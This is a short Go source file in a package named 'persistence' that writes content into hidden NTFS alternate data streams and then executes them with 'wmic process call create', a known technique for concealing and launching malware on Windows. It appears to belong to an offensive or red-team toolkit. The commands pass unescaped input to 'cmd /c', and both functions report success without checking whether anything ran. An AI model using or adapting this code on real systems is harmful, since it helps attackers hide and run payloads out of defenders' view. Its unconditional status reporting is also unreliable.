package persistence

import "os/exec"

type ADSResult struct {
Stream string
Status string
}

func CreateADS(filePath, streamName, content string) ADSResult {
cmd := exec.Command("cmd", "/c", "echo", content, ">", filePath+":"+streamName)
cmd.Run()
return ADSResult{Stream: streamName, Status: "success"}
}

func ExecuteADS(filePath, streamName string) ADSResult {
cmd := exec.Command("cmd", "/c", "wmic", "process", "call", "create", filePath+":"+streamName)
cmd.Run()
return ADSResult{Stream: streamName, Status: "success"}
}
